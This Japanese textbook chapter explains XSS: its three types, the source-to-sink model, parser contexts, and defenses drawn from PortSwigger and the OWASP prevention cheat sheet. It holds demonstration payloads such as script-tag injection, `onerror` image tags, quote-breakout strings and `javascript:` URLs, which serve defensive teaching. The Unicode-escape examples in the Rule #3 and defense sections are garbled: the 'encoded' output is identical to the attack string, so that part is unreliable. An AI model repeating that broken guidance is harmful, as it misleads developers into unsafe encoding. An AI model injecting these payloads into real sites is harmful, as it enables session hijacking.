# 第1章 基礎 ― XSSの3分類・実行コンテキスト・発生原理

## XSSとは何か・反射型XSS・学習パス（PortSwigger）

### この章のねらい

XSS（クロスサイトスクリプティング）は「攻撃者が用意したJavaScriptを、被害者のブラウザの中で、被害者自身のセッション権限で実行させる」脆弱性です。SQLインジェクションが「サーバ側のデータベースに対する権限昇格」だとすれば、XSSは「クライアント側（ブラウザ）における権限昇格」だと考えると理解が速くなります。攻撃者は被害者のパスワードやCookieを直接盗むわけではなく、被害者のブラウザに「被害者になりすまして動くコード」を注入します。この節ではまず業界標準の教材であるPortSwigger Web Security Academyの総論ページと反射型XSSのページを軸に、XSSの定義・3分類・影響・防御の全体像と、最も基本形である反射型XSSの成立条件を仕組みレベルで解説します。最後に、学習を進めるためのプラットフォームの使い方（学習パス）を案内します。

### XSSの定義と、なぜ「クロスサイト」と呼ばれるのか

PortSwiggerの総論ページは、XSSを次のように定義しています。

> "Cross-site scripting (also known as XSS) is a web security vulnerability that allows an attacker to compromise the interactions that users have with a vulnerable application."
> （クロスサイトスクリプティングとは、攻撃者が脆弱なアプリケーションとユーザーとのやり取りを侵害できるようにするWebセキュリティ脆弱性である）

> 出典: Cross-site scripting — https://portswigger.net/web-security/cross-site-scripting

ここで重要なのは、XSSが「サーバの脆弱性」であると同時に「ブラウザの実行モデルを悪用する攻撃」であるという二面性です。名前の由来である「クロスサイト」は、歴史的には「攻撃者のサイトから、脆弱な別サイトへスクリプトを注入する」という初期の攻撃パターンに由来しますが、現在のXSSは必ずしも複数サイトをまたぐ必要はありません（自サイト内の入力欄に自分でスクリプトを仕込んで、それを他人に踏ませるだけでも成立します）。名前と実態がずれているため、初学者は「クロスサイト」という語感に引きずられず、「信頼されていない文字列が、ブラウザにコードとして解釈される場所に紛れ込む」ことこそが本質だと理解してください。

XSSが成立するために必要な条件は、原理的には次の2つだけです。

1. **入力点（Source）**: 攻撃者が何らかの形で文字列をアプリケーションに渡せる（URLパラメータ、フォーム入力、HTTPヘッダ、Cookie、postMessage、URLのフラグメントなど）。
2. **出力点（Sink）**: その文字列が、ブラウザによって「データ」ではなく「コード（あるいはコードを生成する材料）」として解釈される場所に、無害化されずに到達する（HTMLとして描画される、JavaScriptの文字列リテラルに埋め込まれる、`innerHTML`に代入される、`eval`に渡されるなど）。

この「Source → Sink」という図式は、反射型・格納型・DOM型のいずれにも共通する骨格です。3つの型の違いは、突き詰めれば「SourceとSinkの間に、どんな経路（サーバを経由するか、DBに保存されるか、クライアント側JSだけで完結するか）があるか」の違いにすぎません。

### XSSの3分類

PortSwiggerは3種類のXSSを次のように定義しています。

> "Reflected XSS, where the malicious script comes from the current HTTP request."
> "Stored XSS, where the malicious script comes from the website's database."
> "DOM-based XSS, where the vulnerability exists in client-side code rather than server-side code."

> 出典: Cross-site scripting — https://portswigger.net/web-security/cross-site-scripting

#### 反射型XSS（Reflected XSS）

> "Reflected cross-site scripting arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way."
> （反射型XSSは、アプリケーションがHTTPリクエストの中でデータを受け取り、そのデータを安全でない形で即座のレスポンスに含めてしまうときに発生する）

つまり、**1回のリクエスト・レスポンスの往復の中で完結する**XSSです。データベースへの保存を経由しないため、攻撃を成立させるには「悪意あるURLを被害者にクリックさせる」という追加の一手間（ソーシャルエンジニアリング、メール、SNS投稿、罠サイトへの埋め込みなど）が必要になります。この配送コストの高さが、後述するように格納型より一般に深刻度が低いとされる理由です。

#### 格納型XSS（Stored XSS）

> "Stored cross-site scripting arises when an application receives data from an untrusted source and includes that data within its later HTTP responses in an unsafe way."

攻撃者の入力がデータベースやログ、コメント欄、ユーザープロフィールなどに**保存**され、他のユーザーがそのページを閲覧するたびに実行されます。反射型と違って「被害者に特定のURLを踏ませる」手間が不要で、通常のページ閲覧だけで被害者が巻き込まれるため、一般に反射型より深刻度が高いとされます。

#### DOM型XSS（DOM-based XSS）

> "DOM-based XSS arises when an application contains some client-side JavaScript that processes data from an untrusted source in an unsafe way, usually by writing the data back to the DOM."

反射型・格納型が「サーバがHTMLを組み立てる過程」に脆弱性があるのに対し、DOM型は**サーバのレスポンスは無害なのに、ブラウザ内で動くJavaScriptが信頼できない値（`location.hash`、`document.referrer`、`postMessage`のデータなど）を危険なSink（`innerHTML`、`document.write`、`eval`など）に渡してしまう**ことで発生します。サーバ側のログやWAFには「攻撃の痕跡」が残らないことがあり、静的なコードレビューだけでは見つけにくいのが特徴です（DOM型の詳細な機序は本書の後続章で扱います）。

この3分類は「どこに脆弱性のコードがあるか」という軸での分類であり、互いに排他的というより「注入経路の違い」だと捉えるのが正確です。

### 反射型XSSの成立を仕組みレベルで追う

反射型XSSのページでは、次のような教科書的な例が示されています。攻撃者は次のようなURLを組み立てます。

```
https://insecure-website.com/search?term=<script>/* 悪意あるコード */</script>
```

そして、脆弱なアプリケーションは検索語をレスポンスHTMLの中にそのまま埋め込みます。

```html
<p>You searched for: <script>/* 悪意あるコード */</script></p>
```

> 出典: Reflected cross-site scripting — https://portswigger.net/web-security/cross-site-scripting/reflected

**なぜこれで任意コードが実行されるのか**を、ブラウザのHTMLパーサの動作から説明します。ブラウザがHTMLをレンダリングするとき、HTMLパーサは文字列を「テキストノード」「タグ」「属性」といった構造に逐次分解していきます。このとき、パーサは現在どの「解析状態（トークナイザの状態）」にいるかによって、同じ文字（例えば `<` や `"` ）の意味づけをまったく変えます。

上の例では、サーバはユーザー入力（`term`パラメータの値）を「HTMLのテキストノードの内容」としてそのまま出力バッファに連結しています。もし入力が単なる文字列 `gift` であれば、パーサは `<p>You searched for: gift</p>` を「pタグの中のテキスト `You searched for: gift`」として解釈し、何も問題は起きません。

しかし、入力に `<script>...</script>` という文字列がそのまま混入すると、HTMLパーサはこれを**攻撃者が意図した通りに「テキスト」ではなく「新しい要素の開始タグ」として解釈します**。パーサにとって、その文字列がどこから来たか（開発者が書いた固定文字列か、ユーザーが送ってきた入力か）は一切区別されません。HTMLパーサは「文字の並びとその出現位置」だけを見て構文木を組み立てるからです。これが、Web開発において「信頼できるコード（テンプレート側の文字列）」と「信頼できないデータ（ユーザー入力）」を、出力時に明確に区別してエンコードしなければならない根本的な理由です。この区別を怠ると、データがコードに「昇格」してしまいます。

この「コンテキストに応じた解釈の変化」がXSS対策の核心です。同じ `term` パラメータでも、それがどこに出力されるかによって危険な文字集合が変わります。

- **HTMLのテキストノードとして出力される場合**: `<` と `&` が危険（タグの開始やエンティティの開始と解釈されるため）。
- **HTML属性値の中に出力される場合**（例: `<input value="ここ">`）: 属性を閉じる引用符（`"` や `'`）が危険。属性が引用符なしで書かれている場合は空白文字すら危険になります。
- **JavaScriptの文字列リテラルの中に出力される場合**（例: `<script>var x = "ここ";</script>`）: 文字列を終端させる引用符やバックスラッシュ、さらに `</script>` という文字列そのものがHTMLパーサによって「scriptタグの終了」として解釈されてしまう点に注意が必要です（JSパーサとHTMLパーサという2段階の解釈が絡むため）。
- **URLの中に出力される場合**（例: `<a href="ここ">`）: `javascript:` スキームを使われると、リンククリック時にコードが実行されます。

反射型XSSページはこの「コンテキスト依存性」を、後続の攻略手順としてではなく原理として明示しています。攻撃者は自分の入力がどのコンテキストに落ちるかをまず観察し、そのコンテキストを「脱出」するペイロードを選びます。例えば属性値の中であれば `">` でまず属性とタグを閉じ、その後に新しいタグや `onerror` のようなイベントハンドラ属性を続ける、といった具合です。

### なぜ反射型XSSには「配送」という一手間が必要なのか

反射型XSSは「その場限りのリクエスト」に依存するため、攻撃者は**被害者に悪意あるURLを踏ませる**という追加のステップを必ず必要とします。PortSwiggerはこの点を明確にしています。

> "reflected XSS attacks require some way of luring the victim into making an unintended request that triggers the injected code... reflected XSS is generally less severe than stored XSS, where a self-contained attack can be delivered within the vulnerable application itself."

配送手段としては、フィッシングメールに罠URLを埋め込む、SNS投稿やコメント欄にリンクを貼る、短縮URLで見た目を偽装する、第三者サイトの `<img>` や `<iframe>` から誘導するなどが典型です。反射型は「1リクエスト完結」であるがゆえに、CSRF同様、被害者のブラウザに「クリックさせる/踏ませる」フェーズが攻撃全体のボトルネックになります。逆に言えば、反射型XSSを本番環境で評価する際は「このURLを実際に誰かに送りつけられる状況か」を合わせて検討する必要があります（例えば、POSTリクエストでしか再現しない反射型XSSは、GETによるワンクリック攻撃に比べて配送難易度が上がります）。

### 反射型XSSがもたらす実害

反射型XSSは「ただのアラート(`alert(1)`)が出るだけの無害なバグ」と誤解されがちですが、PortSwiggerは実害を明確に列挙しています。

> 攻撃者は被害者になりすまし、被害者が実行できる**あらゆる操作**を実行でき、被害者が閲覧できる**あらゆる情報**にアクセスできる。

具体的には、セッションCookieの窃取（`document.cookie` の外部送信）、CSRFトークンの読み取りによる別の防御機構の無効化、キーロガーの設置、フィッシングフォームの動的な差し込み、管理画面へのリクエストの代理実行（被害者が管理者であれば管理者権限での操作）などが挙げられます。総論ページはより一般的な影響として次を挙げています。

> "impersonate or masquerade as the victim user, carry out any action that the user is able to perform, read any data that the user is able to access, capture the user's login credentials, perform virtual defacement of the website, inject trojan functionality into the website"

> 出典: Cross-site scripting — https://portswigger.net/web-security/cross-site-scripting

深刻度は文脈に強く依存します。ブローシャー的な公開サイト（ログインもなく、個人情報も扱わない）であれば影響は軽微ですが、銀行や医療機関のように機微な情報を扱うアプリケーションでは深刻な情報漏洩につながり、被害者が管理者権限を持つユーザーであれば、XSS一つからアプリケーション全体の乗っ取り（管理アカウントの作成、全ユーザーデータの窃取など）に発展し得ます。

XSSが強力である理由の一つは、**同一オリジンポリシー（Same-Origin Policy）というブラウザの根幹的な防御をすり抜ける**点にあります。同一オリジンポリシーは「あるオリジンのスクリプトが、別オリジンのデータに自由にアクセスすることを防ぐ」仕組みですが、XSSによって注入されたコードは脆弱なサイト自身のオリジンで実行されるため、この防御の内側から動作します。攻撃者はブラウザの防御を破っているのではなく、防御が守ろうとしている「境界」の内側に、正規のコードとして紛れ込んでいるのです。

### 防御の全体像

XSS対策の基本原則は、総論ページと防御ページの双方で共通して示される次の2層構造です。

> "encode data on output" と "validate input on arrival"（出力時のエンコードと、入力到達時のバリデーション）

> 出典: Cross-site scripting: preventing — https://portswigger.net/web-security/cross-site-scripting/preventing

**出力時エンコードがコンテキストごとに異なる**ことが実務上もっとも間違えやすいポイントです。防御ページは次のような対応関係を示しています。

- HTMLコンテキストでは `<` を `&lt;`、`>` を `&gt;` のようにHTMLエンティティへ変換する。
- JavaScript文字列コンテキストでは、英数字以外の文字をUnicodeエスケープする（例: `<` を `<`）。
- HTML属性の中にあるイベントハンドラなど、複数のコンテキストが重なる場所では、**Unicodeエスケープしてから、さらにHTMLエンコードする**という2段階の処理が必要になる場合がある。

言語ごとの実装例として、PHPでは `htmlentities($input, ENT_QUOTES, 'UTF-8')` の使用が挙げられ、JavaScriptには標準のHTMLエンコードAPIが存在しないため独自実装が必要になる点、jQueryでは「セレクタの先頭が `<` の場合にHTMLとして描画される」という仕様上の落とし穴がある点が指摘されています。TwigやJinja、Reactのような現代的なテンプレートエンジンは、デフォルトでコンテキストに応じたエスケープを行うため、これらを正しく使うこと自体が強力な防御になります（ただし `dangerouslySetInnerHTML` のような「エスケープを意図的にバイパスするAPI」を使えば、当然この保護は失われます）。

**入力バリデーションはホワイトリスト方式を基本とすべき**であるとも強調されています。

> "Input validation should generally employ whitelists rather than blacklists."

URLであれば `http://` や `https://` で始まることを確認する、数値項目であれば数字以外を拒否する、といった「許可リスト」の考え方が、「危険な文字列パターンを列挙して拒否する」ブラックリスト方式より堅牢です。ブラックリストは `<script>` を拒否しても `<img onerror=...>` のような別表現を見落としがちで、原理的にいたちごっこになりやすいためです（この点は本書の後続章で、フィルタバイパスの技法として詳しく扱います）。

ユーザーがHTMLそのものを投稿できる機能（リッチテキストエディタなど）はXSSのリスクを本質的に高めるため、防御ページは「可能な限り避けるべき」としつつ、どうしても必要な場合はDOMPurifyのようなクライアントサイドのサニタイズライブラリの利用を推奨しています。

最後の防衛線として、**Content Security Policy（CSP）**が挙げられています。CSPはHTTPレスポンスヘッダでブラウザに「どのオリジンからのスクリプトなら実行してよいか」を宣言する仕組みで、次のような例が示されています。

```
default-src 'self'; script-src 'self'; object-src 'none';
```

インラインスクリプトを許可しつつ攻撃者による差し込みを防ぐ手段として、**nonceベースのCSP**にも言及があります。

> "A nonce is a random string...which will only be executed if the random string matches the server-generated one."

これはレスポンスごとにサーバがランダムな一回限りの文字列（nonce）を生成し、`<script nonce="...">` タグとCSPヘッダの両方に同じ値を埋め込むことで、「サーバが意図して発行したインラインスクリプトだけ」を実行許可する仕組みです。攻撃者は事前にnonce値を知る手段がないため、たとえHTMLインジェクションに成功しても、正しいnonceを持たないスクリプトタグは実行されません（ただし、CSPには数多くのバイパス手法が存在し、単体で万能の防御にはならない点には注意が必要です。これも後の章で扱います）。

なお、かつてInternet ExplorerやChromeには「XSS Auditor」「XSS Filter」と呼ばれる、ブラウザ側でリクエストとレスポンスを比較し反射型XSSらしきパターンを検知してブロックするヒューリスティックな機構が存在しました。しかしこれらは多数の回避手法が発見され、さらに正規のコンテンツを誤ってブロックする副作用（意図せぬ情報漏洩を招く「XSS Auditorを悪用した攻撃」すら発見された）が問題視され、Chromeは2019年にXSS Auditorを撤廃し、Microsoft EdgeもEdgeHTMLエンジンの終了とともにXSS Filterを廃止しました。この歴史が示す設計上の教訓は、「攻撃パターンの検知によるブラックリスト的防御は、ブラウザという巨大な攻撃対象領域の中では原理的に破られる」ということであり、これが現在のセキュリティ業界がCSPのような「許可されたものだけを実行する」ホワイトリスト型・宣言的な防御機構へ軸足を移した理由です。

### まとめ

- XSSの本質は「信頼できない文字列が、ブラウザにコードとして解釈される文脈に、無害化されずに紛れ込む」ことである。
- 反射型・格納型・DOM型の違いは、Source（入力点）からSink（出力点）に至る経路の違いであり、反射型は1リクエストで完結するがゆえに配送に一手間かかり、一般に格納型より深刻度が低いとされる。
- HTMLパーサは「文字がどこから来たか」を区別せず、現在の解析状態に応じて機械的に解釈するため、開発者はコンテキストごとに異なるエスケープ規則を出力時に適用しなければならない。
- 防御は「入力のホワイトリストバリデーション」と「出力のコンテキスト別エンコード」を土台に、CSPやHttpOnly Cookieなどの多層防御を重ねる。ブラウザ組み込みのXSSフィルタのような検知ベースの防御は歴史的に破られ廃止されており、宣言的・許可リスト型の防御へ移行してきたという経緯自体が重要な設計上の教訓である。
- 学習にはPortSwigger Web Security Academyの学習パスが有用であり、体系立ったトピック・モジュール構成で自分のペースで進められる。

## OWASP XSS防御チートシート（出力エンコーディングの原理）

前節までで、XSSが「攻撃者の入力が、意図しない文脈でパーサに解釈されてしまう」ことによって成立する脆弱性であることを見てきました。本節では、その対策の“標準教科書”とも言えるOWASP（Open Worldwide Application Security Project）の「Cross Site Scripting Prevention Cheat Sheet」を軸に、出力エンコーディングがなぜ・どう機能するのか、そしてなぜ「とりあえずHTMLエンティティ化すればいい」という発想が危険なのかを、パーサの状態遷移レベルで解説します。

> 出典: Cross Site Scripting Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html

### 1. 大原則：「単一の技法でXSSは解決しない」

チートシートは冒頭で明言しています。XSS攻撃は「アカウント乗っ取り、ユーザー行動の観測、外部コンテンツの読み込み、機密データの窃取」など深刻な被害につながり得るが、それを防ぐための「単一の技法（single technique）」は存在しない、というものです。防御は複数の戦略の組み合わせ――バリデーション、コンテキストに応じた出力エンコーディング、安全なAPI（Safe Sink）の使用、サニタイズ、CSPのような多層防御――を積み重ねて初めて実効性を持ちます。

チートシートが掲げる理想像は「perfect injection resistance（完全なインジェクション耐性）」です。これは「すべての変数がバリデーションを通過し、その後エスケープまたはサニタイズされる」状態を指します。重要なのは、この処理を**データがレンダリングされる直前、レンダリング先のコンテキストに応じて**行うという点です。ここを誤解して「入力時に一括でHTMLエンティティ化しておけばよい」という設計にすると、後述するように別の文脈（JavaScript、CSS、URLなど）に出力された途端に破綻します。

### 2. なぜ「とりあえずHTMLエンティティ化」では足りないのか——コンテキストごとにパーサが違う

XSSが厄介なのは、ブラウザが受け取ったHTMLドキュメントを解釈する際、**場所によって全く異なる文法（状態機械）が起動する**からです。HTMLパーサは大まかに「タグの外（テキストノード）」「タグ名の直後（属性を待つ状態）」「属性値の中」「`<script>`要素の中身（RAWTEXT/scriptデータ状態）」「`<style>`要素の中身（RAWTEXTのCSS）」といった複数の状態を行き来しながら文字を読み進めます。同じ`<`という文字であっても、テキストノードの中では「新しいタグの開始」と解釈されますが、`<script>`要素の中身では（コメント終端などの特殊シーケンスを除き）ただの文字として扱われます（scriptデータ状態はHTMLタグとしてではなくJavaScriptコードの生テキストとして走査されるため）。

つまり「危険な文字をエスケープする」という発想そのものは正しくても、**どの文字が危険で、どうエスケープすれば安全かはコンテキストごとに異なる**のです。HTML本文用のエスケープ（`<`→`&lt;`など）をJavaScript文字列リテラルの中に適用しても、JavaScriptのパーサはHTMLエンティティを解釈しません。逆に、JavaScript用のエスケープをHTML属性値に適用しても、ブラウザが属性値を区切る引用符自体はHTMLパーサのルールで解釈されます。この「コンテキストのミスマッチ」こそが、多くの実装がXSSを生み出す根本原因です。

そこでチートシートは、代表的な6つの出力コンテキストごとに、Rule #0〜#5として個別のエンコーディングルールを定義しています。加えて、そもそも変数を置いてはいけない「危険なコンテキスト」を明示し、さらにBonus Rulesとしてサニタイズや安全なAPI（Safe Sinks）の使用を推奨しています。以下、順に見ていきます。

### 3. Rule #1: HTML本文コンテキストでのHTMLエンティティエンコーディング

**コンテキストの形**：`<div> $varUnsafe </div>` のように、タグとタグの間（テキストノード）に変数を挿入する場合です。

**エンコーディングの仕組み**：以下の5文字を対応するHTML実体参照に変換します。

| 文字 | エンコード後 |
|---|---|
| `&` | `&amp;` |
| `<` | `&lt;` |
| `>` | `&gt;` |
| `"` | `&quot;` |
| `'` | `&#x27;` |

なぜこれで防げるのでしょうか。HTMLパーサがテキストノードを解釈しているとき、次の要素開始タグの合図として認識するのは生の`<`文字です。`<`を`&lt;`という文字参照に変換すれば、パーサはこれを「文字参照が解決されて生成される`<`という**文字データ**」として扱い、タグ開始の合図とは解釈しません。結果として、攻撃者が`<script>alert(1)</script>`を注入しようとしても、`&lt;script&gt;alert(1)&lt;/script&gt;`という「見た目はスクリプトタグに似た文字列」としてそのまま画面に表示されるだけになります。

**安全なシンク（Safe Sink）による実装**：DOM API側にも、この処理を自動的に行ってくれる「安全な代入先」があります。

```javascript
elem.textContent = dangerVariable;  // 安全なシンク：自動的にエンコードされる
```

`textContent`はDOMツリーにテキストノードとして値を挿入するだけで、HTMLとしてパースし直すことは一切ありません。これに対し`innerHTML`はブラウザに再度HTMLパーサを走らせて子要素を生成させるため、`dangerVariable`に`<img src=x onerror=alert(1)>`のような文字列が入っていれば、そのまま新しい要素として構築され、`onerror`イベントハンドラが実行されてしまいます。「HTMLとして解釈させるAPIか、テキストとしてしか解釈しないAPIか」という違いが、脆弱性の有無を分けているのです。

### 4. Rule #2: HTML属性コンテキストでの属性エンコーディング

**コンテキストの形**：`<div attr="$varUnsafe">` のように、HTML属性の値として変数を挿入する場合です。

チートシートは「変数を必ず引用符（`"`または`'`）で囲むことが極めて重要（critical）」と強調しています。なぜなら、属性値が引用符で囲まれていない場合（`<div attr=$varUnsafe>`のような裸の属性値）、空白文字が事実上の区切り文字になってしまい、攻撃者が空白を含む文字列で新しい属性（たとえば`onmouseover=alert(1)`）を割り込ませられるからです。属性エンコーディングだけでは、この「引用符の有無」という前提条件までは守ってくれません。実装側の規約として引用符必須を徹底する必要があります。

**エンコーディングの仕組み**：英数字以外の**すべての文字**を`&#xHH;`（16進数のUnicodeコードポイントによる数値文字参照）形式に変換します。Rule #1が5文字だけを対象にした限定的なエンコードだったのに対し、属性値コンテキストでは非英数字全般を対象にする、より広い（allowlist方式の）エンコードが要求されます。これは、属性値の中で特別な意味を持ちうる文字（引用符、バックスラッシュ、あるいはブラウザごとのクセのある文字）を網羅的に潰すためです。

**安全なシンク**：

```javascript
elem.setAttribute(safeName, dangerVariable);  // 安全なシンク：自動的にエンコードされる
elem.className = dangerVariable;
formfield.value = dangerVariable;
```

これらのAPIはDOMのプロパティ/属性としてブラウザ内部の属性テーブルに値を格納するだけで、HTML構文として再パースされることはないため、値に引用符や`<`が含まれていても属性の脱出（breakout）にはつながりません。ただし`setAttribute`であっても、属性名側が`href`や`onclick`のような「実行コンテキストを持つ属性名」である場合は別の危険が生じる点に注意が必要です（後述の「危険なコンテキスト」を参照）。

チートシートは、この属性エンコーディングで安全に扱える「安全な属性」の一覧も示しています：`align, alink, alt, bgcolor, border, cellpadding, cellspacing, class, color, cols, colspan, coords, dir, face, height, hspace, ismap, lang, marginheight, marginwidth, multiple, nohref, noresize, noshade, nowrap, ref, rel, rev, rows, rowspan, scrolling, shape, span, summary, tabindex, title, usemap, valign, value, vlink, vspace, width`。これらは値がそのままJavaScriptとして実行されたりURLとして解釈されたりする経路を持たない、純粋に表示用・レイアウト用の属性です。逆に`href`・`src`・`style`・`on*`系イベントハンドラ属性はこのリストに含まれません。これらは値自体が別のサブコンテキスト（URL、CSS、JavaScript）としてさらに解釈されるため、属性エンコーディング**だけ**では不十分だからです。

### 5. Rule #3: JavaScriptコンテキストでのエンコーディングと、その限界

**コンテキストの形**：`<script>alert('$varUnsafe')</script>` のように、インラインの`<script>`要素内、JavaScriptの文字列リテラルの中に変数を挿入する場合です。

ここでチートシートは非常に強い制限を課しています。「JavaScript内で変数を置ける“安全な”場所は、引用符で囲まれたデータ値（quoted data value）の中だけである」。つまり、コード自体を動的生成すること――たとえば変数の値によって呼び出す関数名を変える、プロパティ名をユーザー入力で決める――は、原理的にエンコーディングでは安全化できません。

**なぜ文字列リテラルの中でも注意が必要か**：JavaScriptの文字列リテラルは`'`や`"`で終端されます。ユーザー入力の中に終端文字と同じ文字が含まれていれば、文字列がそこで終わり、その後の文字列はJavaScriptの「コード」として評価されてしまいます。例えば`var x = '$varUnsafe';`というテンプレートに対して`varUnsafe`に`'; alert(1); //`を入れると、生成されるコードは`var x = ''; alert(1); //';`となり、`alert(1)`が実行文として実行されます。

**エンコーディングの仕組み**：英数字以外の文字を`\uXXXX`（4桁16進数のUnicodeコードポイント）というJavaScriptのUnicodeエスケープ形式に変換します。先ほどの例では`'`が`'`にエンコードされるため、生成されるコードは`var x = ''; alert(1); //';`となり、JavaScriptエンジンはこれを「`'`という1文字を含む文字列リテラル全体」として解釈します。文字列の境界を破壊する特殊文字が、パーサに解釈される前に「ただのデータとしての1文字」に還元されるため安全になる、という原理はRule #1・#2と同じです。

**エンコードしても安全にならない危険なコンテキスト**：チートシートはRule #3の一部として、以下のような場所には**エンコーディングをどれだけ正しく行っても変数を置いてはいけない**と明記しています。
- `<script>` タグに直接（コードそのものとして）
- HTMLコメントの中
- イベントハンドラ属性（`onclick`、`onerror`、`onmouseover`など）
- `eval()`、`setInterval()`、`setTimeout()`のような、文字列を後からコードとして評価する危険な関数の引数

これらが危険な理由は共通しています。イベントハンドラ属性は、値の文字列が最終的にJavaScriptとしてコンパイル・実行される「二重のコンテキスト」を持つため、属性エンコーディングでは属性の脱出は防げても、属性値の中身がそのままJavaScriptとして解釈されてしまう問題は防げません。`eval`系の関数も同様に、文字列としては何の変哲もないデータでも、実行時にコードとして再解釈される経路そのものが脆弱性の温床になります。

**JSONに関する補足**：サーバーがJSONをレスポンスとして返す場合、`Content-Type`ヘッダーが`application/json`になっていることを確認する必要があります。これが`text/html`のままだと、ブラウザ（特にレガシーな挙動や特定の設定下）がレスポンスをHTMLとして解釈しようとし、JSON内の文字列（攻撃者が制御できるフィールド値など）がHTMLとして実行されるMIMEタイプ混同型のXSSにつながり得ます。

### 6. Rule #4: CSSコンテキストでのエンコーディング

**コンテキストの形**：`<style>selector { property: $varUnsafe; }</style>` のように、インラインの`<style>`要素内、あるいは`style`属性の値としてCSSプロパティ値に変数を挿入する場合です。

**エンコーディングの仕組み**：CSSの構文は`\XX`（短縮形）または`\XXXXXX`（6桁ゼロ埋めの完全形）というエスケープ表記をサポートしています。たとえば`A`という文字は`\41`（短縮形、後ろにスペースを1つ入れてエンコードの終わりをパーサに伝える必要がある——このスペース自体はCSSパーサによって無視されます）、あるいは`\000041`（6桁固定なのでスペース不要）とエンコードできます。英数字自体はエンコード不要です。

CSSは非常に強力な言語で、`expression()`（レガシーIE専用、後述）や`url()`経由での外部リソース読み込み、`@import`などを通じて、直接コードを実行しなくても情報を盗んだり見た目を改変したりできます。そのため、値そのものが`url(...)`や`expression(...)`のような「危険な関数の引数」になる位置には、そもそも変数を置くべきではないとされています。

**安全なシンク**：

```javascript
style.property = x;  // 安全なシンク：自動的にエンコードされる
```

CSSOM（CSS Object Model）のプロパティに直接代入する形であれば、ブラウザは値をCSS構文として再パースするのではなく、そのプロパティの値としてそのまま設定するため、構文脱出の危険がありません。

### 7. Rule #5: URLコンテキストでのエンコーディング

**コンテキストの形**：`<a href="http://example.com?test=$varUnsafe">link</a>` のように、URLのクエリパラメータ等に変数を挿入する場合です。

**エンコーディングの仕組み**：W3C仕様に準拠したパーセントエンコーディング（`%HH`形式、HHは2桁16進数）を使用します。

**二重エンコーディングの落とし穴（重要な注意）**：URLをさらにHTML属性（`href`など）に埋め込む場合、チートシートは「URLエンコードを先に行い、その後でHTML属性エンコードを行う」という順序を明確に指定しています。

```
url = "https://site.com?data=" + urlencode(parameter)
<a href='attributeEncode(url)'>link</a>
```

順序を間違える、あるいはどちらか一方を省略すると、URL構文としての区切り文字（`&`や`=`など）とHTML属性としての区切り文字（引用符）の両方を同時に守ることができません。たとえば`&`はURLのパラメータ区切りである一方、HTMLエンティティの開始文字でもあるため、両方のパーサの視点を意識してエンコード順序を設計する必要があります。

**安全なシンク**：

```javascript
window.encodeURIComponent(x)  // 安全なシンク：自動的にエンコードされる
```

`encodeURIComponent`はクエリパラメータの1つの値をエンコードする用途に適した関数で、`&`や`=`、`/`なども含めてパーセントエンコードします（`encodeURI`とは対象文字が異なり、`encodeURI`はURL全体を渡す用途のため区切り文字はエンコードしない点に注意——チートシート本文では明示的な比較はありませんが、混同は実務上よくある誤りです）。

### 8. 「危険なコンテキスト」——エンコーディングでは救えない場所

チートシートは、出力エンコーディングという技法そのものが原理的に効かない場所を明示的にリストアップしています。

```html
<script>Directly in a script</script>
<!-- Inside HTML comments -->
<style>Directly in CSS</style>
<div ToDefineAnAttribute=test />
<ToDefineATag href="/test" />
```

さらに、コールバック関数名、`{ background-url: "javascript:alert(xss)"; }`のようなCSS内の`javascript:`スキーム、そしてすべてのJavaScriptイベントハンドラも同様に危険です。

原則としてまとめられているのは次の一文です。「変数を危険なコンテキストに置いてはいけない。出力エンコーディングを行ってもXSS攻撃を完全には防げないからだ（Don't place variables into dangerous contexts as even with output encoding, it will not prevent an XSS attack fully）」。

なぜエンコーディングが無力なのか、原理面から補足します。これらの場所はいずれも「**構文要素そのもの**（タグ名、属性名、コメント区切り、CSSプロパティ名やURLスキームそのもの）を変数が構成している」ケースです。エンコーディングは「データ値の中に紛れ込む区切り文字を無害化する」技術であって、「構文要素自体を安全に動的生成する」技術ではありません。属性名を動的に決めるような設計自体が、そもそもエンコーディングの適用対象外なのです。

### 9. HTMLサニタイズ——エンコーディングが使えない場面のための代替策

WYSIWYGエディタのように、ユーザーが入力したHTML（太字、リンク、リストなど）を**そのままHTMLとして**表示したいケースがあります。この場合、Rule #1のようにすべてエンティティ化してしまうと書式が失われるため、エンコーディングではなく「危険な要素・属性だけを取り除く」サニタイズが必要になります。

チートシートが推奨するライブラリはDOMPurifyです。

```javascript
let clean = DOMPurify.sanitize(dirty);
```

DOMPurifyはDOMツリーをパースした上でアローリスト方式（許可された要素・属性のみを残す）でフィルタリングし、`<script>`要素や`onerror`のようなイベントハンドラ属性、`javascript:`スキームのURLなどを除去します。

ここで2つの重要な警告が添えられています。

1. 「サニタイズした後にコンテンツを加工すると、容易にセキュリティ対策を無効化してしまう（If you sanitize content and then modify it afterwards, you can easily void your security efforts）」。サニタイズ済みの文字列を後から文字列結合したり、別のライブラリで再加工したりすると、サニタイズ時点では安全だった構造が壊れ、危険な構文が復元されてしまうことがあります。サニタイズは「DOMに挿入する直前」に行い、それ以降は加工しないという運用が必須です。
2. 「ブラウザが変化しバイパスが発見され続けるため、定期的なパッチ適用が必要」。サニタイザのバイパスは継続的に発見される研究領域であり（本教科書の後半のmXSS＝mutation XSSの章で詳しく扱います）、ライブラリのバージョンを古いまま固定することは、それ自体が新たな脆弱性になり得ます。

### 10. 安全なシンク（Safe Sinks）と危険なシンクの一覧

チートシートは、DOM APIのうちどれが「データを実行可能なコードとしてではなく、常にテキストデータとして扱う」安全なシンクかを一覧化しています。

```javascript
elem.textContent = dangerVariable;
elem.insertAdjacentText(dangerVariable);
elem.className = dangerVariable;
elem.setAttribute(safeName, dangerVariable);
formfield.value = dangerVariable;
document.createTextNode(dangerVariable);
document.createElement(dangerVariable);
elem.innerHTML = DOMPurify.sanitize(dangerVar);  // サニタイズ済みなら許容
```

対して避けるべき危険なシンクとして`innerHTML`（サニタイズなしの場合）、`outerHTML`、`document.write`、`script.src`が挙げられています。これらは共通して「文字列をHTMLやスクリプトとして**再解釈**する」経路を持つAPIです。安全なシンク側は、値をDOMのプロパティやテキストノードとして直接セットするだけで、値の中身を構文として走査し直すことがありません。この「再解釈するか、しないか」という一点が、Safe SinkとDangerous Sinkを分ける本質的な基準です。

なお、DOM-based XSS Prevention Cheat Sheet（後述）では、この考え方をさらに深掘りし、「未信頼データは常に“表示可能なテキスト”としてのみ扱う」「`object[userInput]`のような動的プロパティアクセスを避け、許可リスト化されたプロパティアクセスにする」といった追加ルールが示されています。

